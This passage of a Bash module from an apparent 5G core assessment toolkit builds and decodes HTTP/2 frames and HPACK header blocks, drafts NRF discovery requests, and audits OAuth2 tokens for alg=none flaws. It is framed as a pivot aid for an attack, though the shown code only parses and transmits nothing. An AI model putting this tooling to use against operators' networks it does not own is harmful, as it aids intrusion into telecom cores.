#!/usr/bin/env bash
# sba_pivot — 5G Service Based Architecture: HTTP/2 framing and NRF/OAuth surface.
#
# The 5G core is a mesh of HTTP/2 JSON micro-services (NRF discovery, AUSF, UDM,
# SMF) authorised by OAuth2 access tokens. This module builds and decodes the
# HTTP/2 frames those services speak (RFC 7540), constructs NRF discovery
# requests (TS 29.510), and audits the tokens — including the alg=none and
# audience-confusion classes that turn a service mesh into a pivot. It reads and
# encodes; it does not authenticate to a core it does not own.
#
# Attack owned: O19 adjacency (core SBA) and the 5G half of O4 — assessment half.
#
# Resolve IMSISTING_ROOT from this script's own path (MODULE_CONVENTIONS §2).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/sba_pivot"
SBAP_DIR="$LOOT_DIR/sba_pivot"
mkdir -p "$MOD_TMP" "$SBAP_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

sbap_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }
SBAP_F=()
sbap_split() {
    SBAP_F=()
    local i n
    n=$(printf '%s' "$1" | awk -F'\t' '{print NF}')
    for (( i = 1; i <= n; i++ )); do
        SBAP_F+=("$(printf '%s' "$1" | cut -f"$i")")
    done
}
sbap_norm_hex() { printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'; }
sbap_is_hex() {
    local h; h=$(sbap_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
sbap_byte() { printf '%02X' "$(( ${1:-0} & 0xFF ))"; }

sbap_status_tsv() {
    printf 'MODULE\tsba_pivot\n'
    printf 'TARGET\tHTTP/2 SBI framing, NRF discovery, OAuth2 token audit\n'
    printf 'TRANSPORT\tHTTP/2 over TCP (or SCTP for N2/N4 interworking)\n'
    printf 'TRANSMIT\tnone — encode, decode and audit only\n'
    printf 'SELFTEST\tyes\n'
}

# ── HTTP/2 frames (RFC 7540 §4.1, §6) ───────────────────────────────────
#   length 3 | type 1 | flags 1 | R+stream id 4  => 9-octet header
sbap_h2_types() {
    cat <<'EOF'
type	frame
0	DATA
1	HEADERS
2	PRIORITY
3	RST_STREAM
4	SETTINGS
5	PUSH_PROMISE
6	PING
7	GOAWAY
8	WINDOW_UPDATE
9	CONTINUATION
EOF
}
sbap_h2_name() {
    case "$1" in
        0) echo DATA ;; 1) echo HEADERS ;; 2) echo PRIORITY ;; 3) echo RST_STREAM ;;
        4) echo SETTINGS ;; 5) echo PUSH_PROMISE ;; 6) echo PING ;; 7) echo GOAWAY ;;
        8) echo WINDOW_UPDATE ;; 9) echo CONTINUATION ;; *) echo unknown ;;
    esac
}
sbap_h2_build() {
    local type="${1:-0}" flags="${2:-0}" sid="${3:-0}" payload
    payload=$(sbap_norm_hex "${4:-}")
    [[ -z "$payload" ]] || sbap_is_hex "$payload" || {
        printf 'ERROR\tpayload must be hex\n' >&2; return 2; }
    local plen=$(( ${#payload} / 2 ))
    printf '%06X%s%s%08X%s' "$(( plen & 0xFFFFFF ))" "$(sbap_byte "$type")" \
        "$(sbap_byte "$flags")" "$(( sid & 0x7FFFFFFF ))" "$payload"
}
sbap_h2_parse() {
    local h; h=$(sbap_norm_hex "${1:-}")
    sbap_is_hex "$h" || { printf 'ERROR\tnot valid hex\n' >&2; return 2; }
    (( ${#h} >= 18 )) || { printf 'ERROR\tHTTP/2 header is 9 octets\n' >&2; return 1; }
    local len=$(( 16#${h:0:6} )) type=$(( 16#${h:6:2} )) flags=$(( 16#${h:8:2} ))
    local sid=$(( 16#${h:10:8} & 0x7FFFFFFF ))
    printf 'length\t%d\ntype\t%d\ntype_name\t%s\nflags\t0x%02X\nstream_id\t%d\n' \
        "$len" "$type" "$(sbap_h2_name "$type")" "$flags" "$sid"
    local body="${h:18:$(( len * 2 ))}"
    if (( ${#h} - 18 < len * 2 )); then
        printf 'truncated\ttrue (payload shorter than the declared length)\n'
        body="${h:18}"
    fi
    printf 'payload\t%s\n' "$body"
    # RFC 7540 §6.2/§6.10: a HEADERS or CONTINUATION frame carries an HPACK
    # header block, after the pad length and the priority fields when those
    # flags are set.
    if (( type == 1 || type == 9 )); then
        local pad=0
        if (( flags & 0x08 )); then
            (( ${#body} >= 2 )) || { printf 'ERROR\tPADDED frame has no pad length octet\n' >&2; return 1; }
            pad=$(( 16#${body:0:2} ))
            printf 'pad_length\t%d\n' "$pad"
            body="${body:2}"
        fi
        if (( flags & 0x20 )); then
            (( ${#body} >= 10 )) || { printf 'ERROR\tPRIORITY fields are 5 octets\n' >&2; return 1; }
            printf 'exclusive\t%d\ndependency\t%d\nweight\t%d\n' \
                "$(( (16#${body:0:2} >> 7) & 1 ))" \
                "$(( 16#${body:0:8} & 0x7FFFFFFF ))" \
                "$(( 16#${body:8:2} + 1 ))"
            body="${body:10}"
        fi
        if (( pad > 0 )); then
            (( ${#body} >= pad * 2 )) || { printf 'ERROR\tpad length %d is longer than the frame\n' "$pad" >&2; return 1; }
            body="${body:0:${#body}-pad*2}"
        fi
        sbap_hpack_decode "$body" "header" || return 1
    fi
    return 0
}

# ── HPACK (RFC 7541): the header block a HEADERS frame carries ──────────
# The SBI is HTTP/2, and an HTTP/2 header list is HPACK-compressed (RFC 7541
# §2.3, §5, §6). Without it a HEADERS frame off the wire shows neither
# :method, :path nor authorization, so the request a service is making cannot
# be read at all — which leaves the module able to name a frame and nothing
# inside it.
#
# The static table of Appendix A, index, name, value.
sbap_hpack_static() {
    cat <<'EOF'
1	:authority	
2	:method	GET
3	:method	POST
4	:path	/
5	:path	/index.html
6	:scheme	http
7	:scheme	https
8	:status	200
9	:status	204
10	:status	206
11	:status	304
12	:status	400
13	:status	404
14	:status	500
15	accept-charset	
16	accept-encoding	gzip, deflate
17	accept-language	
18	accept-ranges	
19	accept	
20	access-control-allow-origin	
21	age	
22	allow	
23	authorization	
24	cache-control	
25	content-disposition	
26	content-encoding	
27	content-language	
28	content-length	
29	content-location	
30	content-range	
31	content-type	
32	cookie	
33	date	
34	etag	
35	expect	
36	expires	
37	from	
38	host	
39	if-match	
40	if-modified-since	
41	if-none-match	
42	if-range	
43	if-unmodified-since	
44	last-modified	
45	link	
46	location	
47	max-forwards	
48	proxy-authenticate	
49	proxy-authorization	
50	range	
51	referer	
52	refresh	
53	retry-after	
54	server	
55	set-cookie	
56	strict-transport-security	
57	transfer-encoding	
58	user-agent	
59	vary	
60	via	
61	www-authenticate	
EOF
}

# The static entry an index names, as "<name>\t<value>".
sbap_hpack_static_name() {
    local idx="${1:-}" i name value
    while IFS=$'\t' read -r i name value; do
        if (( idx == i )); then printf '%s\t%s\n' "$name" "$value"; return 0; fi
    done < <(sbap_hpack_static)
    return 1
}

# Appendix B: symbol, code as hex, code length in bits.
sbap_hpack_huff_table() {
    cat <<'EOF'
0	1FF8	13
1	7FFFD8	23
2	FFFFFE2	28
3	FFFFFE3	28
4	FFFFFE4	28
5	FFFFFE5	28
6	FFFFFE6	28
7	FFFFFE7	28
8	FFFFFE8	28
9	FFFFEA	24
10	3FFFFFFC	30
11	FFFFFE9	28
12	FFFFFEA	28
13	3FFFFFFD	30
14	FFFFFEB	28
15	FFFFFEC	28
16	FFFFFED	28
17	FFFFFEE	28
18	FFFFFEF	28
19	FFFFFF0	28
20	FFFFFF1	28
21	FFFFFF2	28
22	3FFFFFFE	30
23	FFFFFF3	28
24	FFFFFF4	28
25	FFFFFF5	28
26	FFFFFF6	28
27	FFFFFF7	28
28	FFFFFF8	28
29	FFFFFF9	28
30	FFFFFFA	28
31	FFFFFFB	28
32	0014	6
33	03F8	10
34	03F9	10
35	0FFA	12
36	1FF9	13
37	0015	6
38	00F8	8
39	07FA	11
40	03FA	10
41	03FB	10
42	00F9	8
43	07FB	11
44	00FA	8
45	0016	6
46	0017	6
47	0018	6
48	0000	5
49	0001	5
50	0002	5
51	0019	6
52	001A	6
53	001B	6
54	001C	6
55	001D	6
56	001E	6
57	001F	6
58	005C	7
59	00FB	8
60	7FFC	15
61	0020	6
62	0FFB	12
63	03FC	10
64	1FFA	13
65	0021	6
66	005D	7
67	005E	7
68	005F	7
69	0060	7
70	0061	7
71	0062	7
72	0063	7
73	0064	7
74	0065	7
75	0066	7
76	0067	7
77	0068	7
78	0069	7
79	006A	7
80	006B	7
81	006C	7
82	006D	7
83	006E	7
84	006F	7
85	0070	7
86	0071	7
87	0072	7
88	00FC	8
89	0073	7
90	00FD	8
91	1FFB	13
92	7FFF0	19
93	1FFC	13
94	3FFC	14
95	0022	6
96	7FFD	15
97	0003	5
98	0023	6
99	0004	5
100	0024	6
101	0005	5
102	0025	6
103	0026	6
104	0027	6
105	0006	5
106	0074	7
107	0075	7
108	0028	6
109	0029	6
110	002A	6
111	0007	5
112	002B	6
113	0076	7
114	002C	6
115	0008	5
116	0009	5
117	002D	6
118	0077	7
119	0078	7
120	0079	7
121	007A	7
122	007B	7
123	7FFE	15
124	07FC	11
125	3FFD	14
126	1FFD	13
127	FFFFFFC	28
128	FFFE6	20
129	3FFFD2	22
130	FFFE7	20
131	FFFE8	20
132	3FFFD3	22
133	3FFFD4	22
134	3FFFD5	22
135	7FFFD9	23
136	3FFFD6	22
137	7FFFDA	23
138	7FFFDB	23
139	7FFFDC	23
140	7FFFDD	23
141	7FFFDE	23
142	FFFFEB	24
143	7FFFDF	23
144	FFFFEC	24
145	FFFFED	24
146	3FFFD7	22
147	7FFFE0	23
148	FFFFEE	24
149	7FFFE1	23
150	7FFFE2	23
151	7FFFE3	23
152	7FFFE4	23
153	1FFFDC	21
154	3FFFD8	22
155	7FFFE5	23
156	3FFFD9	22
157	7FFFE6	23
158	7FFFE7	23
159	FFFFEF	24
160	3FFFDA	22
161	1FFFDD	21
162	FFFE9	20
163	3FFFDB	22
164	3FFFDC	22
165	7FFFE8	23
166	7FFFE9	23
167	1FFFDE	21
168	7FFFEA	23
169	3FFFDD	22
170	3FFFDE	22
171	FFFFF0	24
172	1FFFDF	21
173	3FFFDF	22
174	7FFFEB	23
175	7FFFEC	23
176	1FFFE0	21
177	1FFFE1	21
178	3FFFE0	22
179	1FFFE2	21
180	7FFFED	23
181	3FFFE1	22
182	7FFFEE	23
183	7FFFEF	23
184	FFFEA	20
185	3FFFE2	22
186	3FFFE3	22
187	3FFFE4	22
188	7FFFF0	23
189	3FFFE5	22
190	3FFFE6	22
191	7FFFF1	23
192	3FFFFE0	26
193	3FFFFE1	26
194	FFFEB	20
195	7FFF1	19
196	3FFFE7	22
197	7FFFF2	23
198	3FFFE8	22
199	1FFFFEC	25
200	3FFFFE2	26
201	3FFFFE3	26
202	3FFFFE4	26
203	7FFFFDE	27
204	7FFFFDF	27
205	3FFFFE5	26
206	FFFFF1	24
207	1FFFFED	25
208	7FFF2	19
209	1FFFE3	21
210	3FFFFE6	26
211	7FFFFE0	27
212	7FFFFE1	27
213	3FFFFE7	26
214	7FFFFE2	27
215	FFFFF2	24
216	1FFFE4	21
217	1FFFE5	21
218	3FFFFE8	26
219	3FFFFE9	26
220	FFFFFFD	28
221	7FFFFE3	27
222	7FFFFE4	27
223	7FFFFE5	27
224	FFFEC	20
225	FFFFF3	24
226	FFFED	20
227	1FFFE6	21
228	3FFFE9	22
229	1FFFE7	21
230	1FFFE8	21
231	7FFFF3	23
232	3FFFEA	22
233	3FFFEB	22
234	1FFFFEE	25
235	1FFFFEF	25
236	FFFFF4	24
237	FFFFF5	24
238	3FFFFEA	26
239	7FFFF4	23
240	3FFFFEB	26
241	7FFFFE6	27
242	3FFFFEC	26
243	3FFFFED	26
244	7FFFFE7	27
245	7FFFFE8	27
246	7FFFFE9	27
247	7FFFFEA	27
248	7FFFFEB	27
249	FFFFFFE	28
250	7FFFFEC	27
251	7FFFFED	27
252	7FFFFEE	27
253	7FFFFEF	27
254	7FFFFF0	27
255	3FFFFEE	26
256	3FFFFFFF	30
EOF
}

declare -gA SBAP_HUFF_TRIE=()
# A Huffman code is prefix free, so a table keyed by "<length>:<bits>" is
# enough to decode: walk bits until the key exists, which is the symbol.
sbap_hpack_huff_init() {
    (( ${#SBAP_HUFF_TRIE[@]} > 0 )) && return 0
    # Appendix B prints each code as hex aligned to the LSB, so the code is
    # the low <len> bits of that number, not its first <len> bits.
    local sym hx len bits v k
    while IFS=$'\t' read -r sym hx len; do
        v=$(( 16#$hx ))
        bits=""
        for (( k = len - 1; k >= 0; k-- )); do
            if (( (v >> k) & 1 )); then bits+="1"; else bits+="0"; fi
        done
        SBAP_HUFF_TRIE["${len}:${bits}"]=$sym
    done < <(sbap_hpack_huff_table)
}

# The first n bits of a hex string, as a string of 0 and 1.
sbap_hpack_hex_bits() {
    local hz="${1:-}" n="${2:-0}" i b out=""
    local map=(0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111)
    for (( i = 0; i < ${#hz}; i++ )); do
        b=$(( 16#${hz:i:1} ))
        out+="${map[b]}"
    done
    printf '%s' "${out:0:n}"
}

# Hex to text. The SBI's header names and values are ASCII; a NUL cannot be
# carried by a shell string, so it is reported rather than silently dropped.
sbap_hpack_text() {
    local hz="${1:-}" i out="" ch
    for (( i = 0; i < ${#hz}; i += 2 )); do
        if (( 16#${hz:i:2} == 0 )); then
            printf 'ERROR\tHPACK value carries a NUL octet, which this shell cannot hold\n' >&2
            return 1
        fi
        printf -v ch "\\$(printf '%03o' "$(( 16#${hz:i:2} ))")"
        out+="$ch"
    done
    printf '%s' "$out"
}

# §5.2. At the end, at most seven bits of EOS prefix are allowed as padding.
sbap_hpack_huff_decode() {
    local hz="${1:-}" bits acc="" out="" sym i total ch
    sbap_hpack_huff_init
    bits=$(sbap_hpack_hex_bits "$hz" 999999)
    total=${#bits}
    (( total > 0 )) || { printf ''; return 0; }
    for (( i = 0; i < total; i++ )); do
        acc+="${bits:i:1}"
        if [[ -n "${SBAP_HUFF_TRIE["${#acc}:${acc}"]+x}" ]]; then
            sym=${SBAP_HUFF_TRIE["${#acc}:${acc}"]}
            if (( sym == 256 )); then
                printf 'ERROR\tHPACK Huffman data carries the EOS symbol (256)\n' >&2
                return 1
            fi
            printf -v ch "\\$(printf '%03o' "$sym")"
            out+="$ch"
            acc=""
        fi
        if (( ${#acc} > 30 )); then
            printf 'ERROR\tHPACK Huffman code is longer than the 30 bits of the table\n' >&2
            return 1
        fi
    done
    if (( ${#acc} > 7 )); then
        printf 'ERROR\tHPACK Huffman data ends in %s bits, which is not the EOS prefix\n' "${#acc}" >&2
        return 1
    fi
    [[ "$acc" =~ ^1*$ ]] || { printf 'ERROR\tHPACK Huffman padding is not the ones of the EOS prefix\n' >&2; return 1; }
    printf '%s' "$out"
}

# §5.1: an integer with an N-bit prefix. Prints "<value> <octets used>".
sbap_hpack_uint() {
    local hz="${1:-}" off="${2:-0}" pb="${3:-0}" b v used=1 m=0
    local max=$(( (1 << pb) - 1 ))
    (( (off + 1) * 2 <= ${#hz} )) || { printf 'ERROR\tHPACK block ends inside an integer\n' >&2; return 1; }
    b=$(( 16#${hz:$((off*2)):2} ))
    v=$(( b & max ))
    if (( v != max )); then
        printf '%s %s\n' "$v" "$used"
        return 0
    fi
    while :; do
        (( (off + used + 1) * 2 <= ${#hz} )) || { printf 'ERROR\tHPACK integer runs past the block\n' >&2; return 1; }
        b=$(( 16#${hz:$(((off + used)*2)):2} ))
        v=$(( v + ((b & 0x7F) << m) ))
        used=$(( used + 1 ))
        m=$(( m + 7 ))
        (( b & 0x80 )) || break
        if (( m > 28 )); then
            printf 'ERROR\tHPACK integer is longer than 28 bits\n' >&2
            return 1
        fi
    done
    printf '%s %s\n' "$v" "$used"
}

# §5.2: a string literal. Prints "<huffman> <octets as hex> <octets used>".
sbap_hpack_string() {
    local hz="${1:-}" off="${2:-0}" b huff r len used
    (( (off + 1) * 2 <= ${#hz} )) || { printf 'ERROR\tHPACK block ends inside a string\n' >&2; return 1; }
    b=$(( 16#${hz:$((off*2)):2} ))
    huff=$(( (b >> 7) & 1 ))
    r=$(sbap_hpack_uint "$hz" "$off" 7) || return 1
    len=${r% *}
    used=${r#* }
    if (( off + used + len > ${#hz} / 2 )); then
        printf 'ERROR\tHPACK string claims %s octets and the block carries %s\n' \
            "$len" "$(( ${#hz} / 2 - off - used ))" >&2
        return 1
    fi
    printf '%s %s %s\n' "$huff" "${hz:$(((off + used)*2)):$((len*2))}" "$(( used + len ))"
}

# §6: decode a header block. Prints <prefix>.N.<field> per header plus the
# table state, so the same block can be read twice (a dynamic table entry
# refers to an earlier block and must be decoded in order).
declare -ga SBAP_HPACK_NAME=() SBAP_HPACK_VALUE=()
declare -g  SBAP_HPACK_SIZE=0 SBAP_HPACK_MAX=4096 SBAP_HPACK_N=0

sbap_hpack_reset() {
    SBAP_HPACK_NAME=()
    SBAP_HPACK_VALUE=()
    SBAP_HPACK_SIZE=0
    SBAP_HPACK_MAX=4096
    SBAP_HPACK_N=0
}

# §6: decode one header block into the shared dynamic table. A block of a
# request is not the whole story — the next request on the connection refers
# back to entries this one inserted, which is why the table is module state
# and not a local.
sbap_hpack_block() {
    local hz; hz=$(sbap_norm_hex "${1:-}")
    sbap_is_hex "$hz" || { printf 'ERROR\tnot valid hex\n' >&2; return 2; }
    local prefix="${2:-hpack}"
    local off=0 total n
    total=$(( ${#hz} / 2 ))
    n=$SBAP_HPACK_N
    while (( off < total )); do
        local b repr pb r used idx name value size sr huff hexv dn
        b=$(( 16#${hz:$((off*2)):2} ))
        if (( (b & 0x80) != 0 )); then
            r=$(sbap_hpack_uint "$hz" "$off" 7) || return 1
            idx=${r% *}; used=${r#* }
            if (( idx == 0 )); then
                printf 'ERROR\tHPACK index 0 is not a header field (a static index is 1..61)\n' >&2
                return 1
            fi
            if (( idx <= 61 )); then
                IFS=$'\t' read -r name value < <(sbap_hpack_static_name "$idx")
            else
                dn=$(( idx - 61 ))
                if (( dn > ${#SBAP_HPACK_NAME[@]} )); then
                    printf 'ERROR\tHPACK index %s is past the static table and the %s dynamic entries; feed the earlier blocks first\n' \
                        "$idx" "${#SBAP_HPACK_NAME[@]}" >&2
                    return 1
                fi
                name="${SBAP_HPACK_NAME[dn-1]}"
                value="${SBAP_HPACK_VALUE[dn-1]}"
            fi
            printf '%s.%d.repr\tindexed\n' "$prefix" "$n"
            printf '%s.%d.index\t%s\n' "$prefix" "$n" "$idx"
            printf '%s.%d.name\t%s\n' "$prefix" "$n" "$(sbap_sanitize "$name")"
            printf '%s.%d.value\t%s\n' "$prefix" "$n" "$(sbap_sanitize "$value")"
            off=$(( off + used ))
            n=$(( n + 1 ))
            continue
        fi
        if (( (b & 0x40) != 0 )); then
            repr=with-indexing; pb=6
        elif (( (b & 0x20) != 0 )); then
            repr=size-update; pb=5
        elif (( (b & 0x10) != 0 )); then
            repr=never-indexed; pb=4
        else
            repr=without-indexing; pb=4
        fi
        if [[ "$repr" == size-update ]]; then
            r=$(sbap_hpack_uint "$hz" "$off" 5) || return 1
            size=${r% *}; used=${r#* }
            SBAP_HPACK_MAX=$size
            while (( SBAP_HPACK_SIZE > SBAP_HPACK_MAX && ${#SBAP_HPACK_NAME[@]} > 0 )); do
                local last=$(( ${#SBAP_HPACK_NAME[@]} - 1 ))
                SBAP_HPACK_SIZE=$(( SBAP_HPACK_SIZE - ${#SBAP_HPACK_NAME[last]} - ${#SBAP_HPACK_VALUE[last]} - 32 ))
                unset 'SBAP_HPACK_NAME[last]' 'SBAP_HPACK_VALUE[last]'
                SBAP_HPACK_NAME=("${SBAP_HPACK_NAME[@]}")
                SBAP_HPACK_VALUE=("${SBAP_HPACK_VALUE[@]}")
            done
            printf '%s.%d.repr\tsize-update\n' "$prefix" "$n"
            printf '%s.%d.max_size\t%s\n' "$prefix" "$n" "$SBAP_HPACK_MAX"
            off=$(( off + used ))
            n=$(( n + 1 ))
            continue
        fi
        r=$(sbap_hpack_uint "$hz" "$off" "$pb") || return 1
        idx=${r% *}; used=${r#* }
        if (( idx == 0 )); then
            sr=$(sbap_hpack_string "$hz" "$(( off + used ))") || return 1
            huff=${sr%% *}; sr=${sr#* }
            hexv=${sr%% *}; used=$(( used + ${sr#* } ))
            if (( huff == 1 )); then
                name=$(sbap_hpack_huff_decode "$hexv") || return 1
            else
                name=$(sbap_hpack_text "$hexv") || return 1
            fi
        else
            if (( idx <= 61 )); then
                IFS=$'\t' read -r name _ < <(sbap_hpack_static_name "$idx")
            else
                dn=$(( idx - 61 ))
                if (( dn > ${#SBAP_HPACK_NAME[@]} )); then
                    printf 'ERROR\tHPACK name index %s is past the tables; a literal name is index 0\n' "$idx" >&2
                    return 1
                fi
                name="${SBAP_HPACK_NAME[dn-1]}"
            fi
        fi
        sr=$(sbap_hpack_string "$hz" "$(( off + used ))") || return 1
        huff=${sr%% *}; sr=${sr#* }
        hexv=${sr%% *}; used=$(( used + ${sr#* } ))
        if (( huff == 1 )); then
            value=$(sbap_hpack_huff_decode "$hexv") || return 1
        else
            value=$(sbap_hpack_text "$hexv") || return 1
        fi
        printf '%s.%d.repr\t%s\n' "$prefix" "$n" "$repr"
        printf '%s.%d.name\t%s\n' "$prefix" "$n" "$(sbap_sanitize "$name")"
        printf '%s.%d.value\t%s\n' "$prefix" "$n" "$(sbap_sanitize "$value")"
        if [[ "$repr" == with-indexing ]]; then
            SBAP_HPACK_NAME=("$name" "${SBAP_HPACK_NAME[@]}")
            SBAP_HPACK_VALUE=("$value" "${SBAP_HPACK_VALUE[@]}")
            SBAP_HPACK_SIZE=$(( SBAP_HPACK_SIZE + ${#name} + ${#value} + 32 ))
            # §4.4: an insertion that passes the limit evicts from the back
            # (the oldest entry) until it fits; an entry larger than the table
            # evicts every other entry and is not stored itself.
            while (( SBAP_HPACK_SIZE > SBAP_HPACK_MAX && ${#SBAP_HPACK_NAME[@]} > 0 )); do
                local last=$(( ${#SBAP_HPACK_NAME[@]} - 1 ))
                SBAP_HPACK_SIZE=$(( SBAP_HPACK_SIZE - ${#SBAP_HPACK_NAME[last]} - ${#SBAP_HPACK_VALUE[last]} - 32 ))
                unset 'SBAP_HPACK_NAME[last]' 'SBAP_HPACK_VALUE[last]'
                SBAP_HPACK_NAME=("${SBAP_HPACK_NAME[@]}")
                SBAP_HPACK_VALUE=("${SBAP_HPACK_VALUE[@]}")
            done
        fi
        off=$(( off + used ))
        n=$(( n + 1 ))
    done
    SBAP_HPACK_N=$n
    return 0
}

sbap_hpack_state() {
    local prefix="${1:-hpack}"
    printf '%s.count\t%s\n' "$prefix" "$SBAP_HPACK_N"
    printf '%s.dynamic_entries\t%s\n' "$prefix" "${#SBAP_HPACK_NAME[@]}"
    printf '%s.table_size\t%s\n' "$prefix" "$SBAP_HPACK_SIZE"
    printf '%s.max_size\t%s\n' "$prefix" "$SBAP_HPACK_MAX"
}

# One header block on its own.
sbap_hpack_decode() {
    sbap_hpack_reset
    local rc=0
    sbap_hpack_block "${1:-}" "${2:-hpack}" || rc=$?
    (( rc == 0 )) || return "$rc"
    sbap_hpack_state "${2:-hpack}"
    return 0
}

# A run of header blocks on one connection: the dynamic table carries over.
sbap_hpack_decode_seq() {
    local prefix="${1:-hpack}"
    shift || true
    (( $# > 0 )) || { printf 'ERROR\tusage: --hpack-seq <block> [<block> ...]\n' >&2; return 2; }
    sbap_hpack_reset
    local blk
    local rc=0
    for blk in "$@"; do
        sbap_hpack_block "$blk" "$prefix" || { rc=$?; return "$rc"; }
    done
    sbap_hpack_state "$prefix"
    return 0
}

# --hpack <block hex> [<block hex> ...]: one header block, or the sequence a
# connection sends (a later block may index entries a earlier one inserted).
sbap_cmd_hpack() {
    [[ -n "${1:-}" ]] || { printf 'usage: --hpack <header-block hex> [<more blocks>]\n' >&2; return 2; }
    sbap_hpack_decode_seq hpack "$@"
}

# ── SETTINGS parameters (RFC 7540 §6.5.2) ───────────────────────────────
sbap_settings_parse() {
    local h; h=$(sbap_norm_hex "${1:-}")
    sbap_is_hex "$h" || { printf 'ERROR\tnot valid hex\n' >&2; return 2; }
    (( ${#h} % 12 == 0 )) || { printf 'ERROR\tSETTINGS payload must be a multiple of 6 octets\n' >&2; return 1; }
    printf 'id\tname\tvalue\n'
    local off=0
    while (( off*2 < ${#h} )); do
        local id=$(( 16#${h:$((off*2)):4} ))
        local val=$(( 16#${h:$((off*2+4)):8} ))
        local name
        case "$id" in
            1) name=HEADER_TABLE_SIZE ;; 2) name=ENABLE_PUSH ;; 3) name=MAX_CONCURRENT_STREAMS ;;
            4) name=INITIAL_WINDOW_SIZE ;; 5) name=MAX_FRAME_SIZE ;; 6) name=MAX_HEADER_LIST_SIZE ;;
            *) name=unknown ;;
        esac
        printf '%d\t%s\t%d\n' "$id" "$name" "$val"
        off=$(( off + 6 ))
    done
}

# ── NRF discovery (TS 29.510 §5.3 / §6.2.3) ─────────────────────────────
sbap_nf_paths() {
    cat <<'EOF'
service	path
nnrf-disc	/nnrf-disc/v1/nf-instances
nnrf-nfm	/nnrf-nfm/v1/nf-instances
nausf-auth	/nausf-auth/v1/ue-authentications
nudm-sdm	/nudm-sdm/v1/imsi-{imsi}/sm-data
nudm-uecm	/nudm-uecm/v1/imsi-{imsi}/registrations
nsmf-pdusession	/nsmf-pdusession/v1/sm-contexts
nbsf-management	/nbsf-management/v1/pcfBindings
EOF
}
sbap_nrf_discovery() {
    local target="${1:-UDM}" requester="${2:-AMF}"
    printf 'method\tGET\npath\t/nnrf-disc/v1/nf-instances\n'
    printf 'query\ttarget-nf-type=%s&requester-nf-type=%s\n' "$target" "$requester"
    printf 'header\taccept: application/3gppHal+json\n'
    printf 'url\t/nnrf-disc/v1/nf-instances?target-nf-type=%s&requester-nf-type=%s\n' "$target" "$requester"
}

# ── JWT / JOSE (RFC 7515, RFC 7519) ─────────────────────────────────────
sbap_b64url_decode() {
    local s="${1:-}" m
    s=$(printf '%s' "$s" | sed 's/-/+/g; s/_/\//g')
    m=$(( ${#s} % 4 ))
    if (( m == 2 )); then s="${s}=="; elif (( m == 3 )); then s="${s}="
    elif (( m != 0 )); then printf 'ERROR\tbad base64url length\n' >&2; return 2; fi
    printf '%s' "$s" | base64 -d 2>/dev/null || { printf 'ERROR\tbase64url decode failed\n' >&2; return 2; }
}
sbap_b64url_encode() {
    printf '%s' "${1:-}" | { base64 -w0 2>/dev/null || base64 | tr -d '\n'; } | sed 's/+/-/g; s#/#_#g; s/=*$//'
}
sbap_jwt_parts() {
    local tok="${1:-}"
    [[ "$tok" == *.*.* ]] || { printf 'ERROR\tJWT must have three dot-separated parts\n' >&2; return 1; }
    printf '%s' "${tok%%.*}"
    printf '\t%s' "$(printf '%s' "$tok" | cut -d. -f2)"
    printf '\t%s' "$(printf '%s' "$tok" | cut -d. -f3-)"
}
sbap_jwt_decode() {
    local tok="${1:-}"
    local h p s
    h="${tok%%.*}"
    p=$(printf '%s' "$tok" | cut -d. -f2)
    s=$(printf '%s' "$tok" | cut -d. -f3-)
    local header payload
    header=$(sbap_b64url_decode "$h") || return 2
    payload=$(sbap_b64url_decode "$p") || return 2
    local alg
    alg=$(printf '%s' "$header" | sed -n 's/.*"alg"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    [[ -n "$alg" ]] || alg="<none-declared>"
    printf 'alg\t%s\nalg_none\t%s\nheader\t%s\npayload\t%s\nsignature_len\t%d\n' \
        "$alg" "$([[ "${alg,,}" == "none" ]] && echo yes || echo no)" \
        "$(sbap_sanitize "$header")" "$(sbap_sanitize "$payload")" "$(( ${#s} ))"
}
sbap_jwt_audit() {
    local tok="${1:-}" expected="${2:-}"
    local h p
    h="${tok%%.*}"; p=$(printf '%s' "$tok" | cut -d. -f2)
    local header payload alg
    header=$(sbap_b64url_decode "$h") || return 2
    payload=$(sbap_b64url_decode "$p") || return 2
    alg=$(printf '%s' "$header" | sed -n 's/.*"alg"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    printf 'finding\tseverity\tdetail\n'
    local n=0
    if [[ "${alg,,}" == "none" ]]; then
        printf 'alg_none\tCRITICAL\tthe token declares alg=none; a verifier that honours it accepts any payload\n'; n=$((n+1))
    fi
    local aud
